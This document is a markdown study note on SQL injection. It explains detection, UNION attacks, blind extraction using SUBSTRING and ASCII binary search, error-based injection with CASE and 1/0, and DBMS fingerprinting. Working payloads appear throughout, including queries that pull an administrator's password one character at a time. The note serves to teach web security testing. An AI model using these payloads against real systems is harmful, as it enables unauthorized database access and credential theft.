# SQLi

## How to detect SQL injection
- [ ] The single quote character `'` and look for errors or other anomalies.
- [ ] Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- [ ] Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
- [ ] Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- [ ] OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

## Examining the database in SQLi

To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

- [ ] The type and version of the database software.
- [ ] The tables and columns that the database contains.

# 1. Querying the database type and version

| Database type    | Query                   |
| ---------------- | ----------------------- |
| Microsoft, MySQL | SELECT @@version        |
| Oracle           | SELECT * FROM v$version |
| PostgreSQL       | SELECT version()        |

# 2. Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database:

```sql
SELECT table_name FROM information_schema.tables
```

You can then query `information_schema.columns` to list the columns in individual tables:

```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'Users'
```

### Listing the contents of an Oracle database

You can list tables by querying `all_tables`:
```sql
SELECT table_name FROM all_tables
```

You can list columns by querying `all_tab_columns`:
```sql
SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS'
```

# SQL injection UNION attacks

1. When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.
2. The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query.

For a `UNION` query to work, two key requirements must be met:

- [ ] The individual queries must return the same number of columns.
- [ ] The data types in each column must be compatible between the individual queries.

This normally involves finding out:

- [ ] How many columns are being returned from the original query.
- [ ] Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

## 1. Determining the number of columns required

### 1. injecting a series of `ORDER BY` clauses and incrementing the specified column index until an err
or occurs.

```sql
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3--
```


> [!NOTE] Note
> The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error.

### 2. Submitting a series of `UNION SELECT` payloads specifying a different number of `NULL` values

```sql
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL--
```

If the number of nulls does not match the number of columns, the database returns an error.
**In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.**

### 3. Database-specific syntax

> On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose.

So the injected queries on Oracle would need to look like:
```SQL
' UNION SELECT NULL FROM DUAL--
```

> [!NOTE] Comment
> The payloads described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.

## 2. Finding columns with a useful data type

The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data. 
After you determine the number of required columns, you can probe each column to test whether it can hold string data.

You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

```sql
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

## 3. Using a SQL injection UNION attack to retrieve interesting data

When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

Suppose that:

- [ ] The original query returns two columns, both of which can hold string data.
- [ ] The injection point is a quoted string within the `WHERE` clause.
- [ ] The database contains a table called `users` with the columns `username` and `password`.

In order to perform this attack, you need to know that there is a table called `users` with two columns called `username` and `password`. Without this information, you would have to guess the names of the tables and columns.  

# Blind SQL injection
## Exploiting blind SQL injection by triggering conditional responses

```sql
…xyz' AND '1'='1 
…xyz' AND '1'='2
```

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

```sql
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
```

## SUBSTRING Explained:

When an attacker cannot see the data returned by the database (i.e., the web page does not display the results of a query), they use the `SUBSTRING()` function to extract data **one character at a time** by asking the database True/False questions.

| **Database**      | **Function Syntax**                                | **Example Payload**                           |
| ----------------- | -------------------------------------------------- | --------------------------------------------- |
| **MySQL**         | `SUBSTRING(str, pos, len)` or `MID(str, pos, len)` | `AND SUBSTRING(user(),1,1)='r'`               |
| **PostgreSQL**    | `SUBSTRING(str, pos, len)`                         | `AND SUBSTRING(version(),1,1)='P'`            |
| **MS SQL Server** | `SUBSTRING(str, pos, len)`                         | `AND SUBSTRING((SELECT @@version),1,1)='M'`   |
| **Oracle**        | `SUBSTR(str, pos, len)`                            | `AND SUBSTR((SELECT user FROM dual),1,1)='S'` |

When you are doing Blind SQL Injection manually (or even when a tool does it), asking "Is the letter A?", "Is the letter B?", "Is the letter C?" takes a very long time.

The "ASCII and Binary Search" method is a way to find the letter much faster by treating it like a game of "High or Low."

### 1. The Translation (Letters to Numbers)

First, you need to understand that databases (and computers) see every letter as a number, known as an **ASCII code**.

- `a` = 97
- `b` = 98
- `c` = 99
- ...
- `s` = 115

So, if the password in the database is "**s**ecret", the first letter is `s`. To the database, that first letter is the number **115**.

### 2. The "Slow" Way (Linear Search)

If you guess letters one by one, you are doing this:

- "Is the letter 'a' (97)?" -> **False**
- "Is the letter 'b' (98)?" -> **False**
- ... (17 more requests) ...
- "Is the letter 's' (115)?" -> **True**

That took roughly 19 requests just to find _one_ letter. If the password is long, this takes forever.

### 3. The "Fast" Way (Binary Search)

This is the "Optimization" I mentioned. Instead of guessing specific numbers, we split the possible range in half repeatedly.

Imagine we are looking for `s` (which is 115). We know standard printable characters are usually between 32 and 127.

**The Attack Flow:**

1. **Question 1:** "Is the ASCII value **greater than 100**?"
    - _Query:_ `AND ASCII(SUBSTRING(password,1,1)) > 100`
    - _Database Reality:_ 115 > 100.
    - _Result:_ **TRUE** (The page loads normally).
    - _Logic:_ We just eliminated letters 'a' through 'd' (everything below 100). We know the letter is effectively between 101 and 127.

2. **Question 2:** "Is the ASCII value **greater than 115**?"
    - _Query:_ `AND ASCII(SUBSTRING(password,1,1)) > 115`
    - _Database Reality:_ 115 is not greater than 115.
    - _Result:_ **FALSE** (The page breaks or is blank).
    - _Logic:_ Now we know the number is NOT higher than 115. So it must be between 101 and 115.

3. **Question 3:** "Is the ASCII value **greater than 107**?" (Splitting the remaining range)
    - _Result:_ **TRUE**.
    - _Logic:_ The number is between 108 and 115.

By continuing to cut the range in half, you can find _any_ character in about **7 requests** mathematically, whereas guessing one by one could take up to 90+ requests.
### Summary

When you see a payload like this:

```SQL
AND ASCII(SUBSTRING((SELECT password FROM users), 1, 1)) > 100
```

It is doing three things:

1. **`SUBSTRING`**: Grabs the letter 's'.
2. **`ASCII`**: Turns 's' into the number 115.
3. **`> 100`**: Asks the True/False question to narrow down the search.
---

## **Conditional Error-Based SQL Injection**.

Unlike standard Boolean Blind injection (where you look for missing content) or Time-Based injection (where you look for a delay), this technique relies on **forcing the database to crash (throw an error)** only when a specific condition is met.

Here is the breakdown of the logic:
### The Mechanism: `CASE` and `1/0`

The core of this attack is the `1/0` operation. In mathematics and most databases (like PostgreSQL, Oracle, and MS SQL), dividing a number by zero is impossible and causes a **critical error**.

The `CASE` statement acts as a switch:

- If the condition is **TRUE**, run the code that crashes the database (`1/0`).
- If the condition is **FALSE**, run the safe code (`'a'`).

### Payload 1: The "Safe" Request (False Condition)

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

1. **The Trigger:** The database evaluates `CASE WHEN (1=2)`.
2. **The Logic:** Is 1 equal to 2? **No (False)**.
3. **The Path:** Because it is False, the database **skips** the `THEN 1/0` part.
4. **The Execution:** It jumps to `ELSE 'a'`.
5. **The Result:** The query becomes `AND 'a'='a'`, which is valid.
6. **Observed Behavior:** The web page loads normally (HTTP 200 OK).

**Conclusion:** The database confirms the condition (`1=2`) is False because the page _didn't_ crash.

### Payload 2: The "Crash" Request (True Condition)

```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

1. **The Trigger:** The database evaluates `CASE WHEN (1=1)`.
 2. **The Logic:** Is 1 equal to 1? **Yes (True)**.
3. **The Path:** Because it is True, the database executes the `THEN` clause.
4. **The Execution:** It tries to calculate `1/0`.
5. **The Result:** **Division by Zero Error**.
6. **Observed Behavior:** The web page likely returns an **HTTP 500 Internal Server Error** or a generic error message.

**Conclusion:** The attacker knows the condition (`1=1`) is True _because_ the page crashed.
### Why use this?

You use this when the application is "Blind" but handles errors differently than false results.

- **Scenario:** Imagine an application where searching for a non-existent ID (False) simply returns "No results found" (HTTP 200), but a syntax error causes a generic "System Error" page (HTTP 500).
- **Strategy:** You can't distinguish True/False by looking for missing content (both might look the same). But you _can_ distinguish "Safe" vs "Crash".
### Important Note on Database Compatibility

This specific payload (`1/0`) works best on **PostgreSQL**, **MS SQL Server**, and **Oracle**.
In MySQL, dividing by zero usually returns `NULL` rather than throwing a critical error (unless strict mode is enabled). For MySQL, you often have to use different error-forcing functions like `EXP(710)` (math overflow) or huge geometric calculations to achieve the same crash effect.


> [!NOTE] Note
> We don't need a CASE expression in order for it to work. The following is the alternative payload: ' || (select TO_CHAR(1/0) FROM users WHERE username='administrator' and SUBSTR(password,1,1)='a')|| '

# How to Exploit Blind SQLi

==We can ask DBMS for empty string in blind sqli==

## **Detect DBMS type:**

| **DBMS**                 | **Detection Payload**                                      | **Unique Feature Tested**                                                                                                                                                | **Expected Result**               |
| ------------------------ | ---------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------- |
| **Oracle**               | ' AND (SELECT 1 FROM DUAL) = 1 --                          | The mandatory pseudo-table **`DUAL`**.                                                                                                                                   | **TRUE** $\implies$ Oracle        |
| **MySQL**                | ' AND (SELECT 1 FROM mysql.user) = 1 --                    | Access to the standard system table **`mysql.user`** or the use of **`VERSION()`** without parentheses: `' AND 1=1 AND LENGTH(VERSION) > 0 --`.                          | **TRUE** $\implies$ MySQL         |
| **PostgreSQL**           | ' AND (SELECT 1 FROM pg_database) = 1 --                   | Access to the standard system table **`pg_database`** or the use of the function **`version()`** (lowercase with parentheses): `' AND 1=1 AND LENGTH(version()) > 0 --`. | **TRUE** $\implies$ PostgreSQL    |
| **Microsoft SQL Server** | ' AND 1=1 AND (SELECT 1 FROM master.dbo.sysobjects) = 1 -- | Access to the system catalog table **`master.dbo.sysobjects`**.                                                                                                          | **TRUE** $\implies$ MS SQL Server |

## **Determine if the users table exist:**

| ' AND (SELECT '' FROM users WHERE ROWNUM=1) IS NOT NULL --                                   | Oracle |
| -------------------------------------------------------------------------------------------- | ------ |
| ' AND (CASE WHEN (SELECT '' FROM users WHERE ROWNUM=1) IS NOT NULL THEN 1 ELSE 0 END) = 1 -- |        |
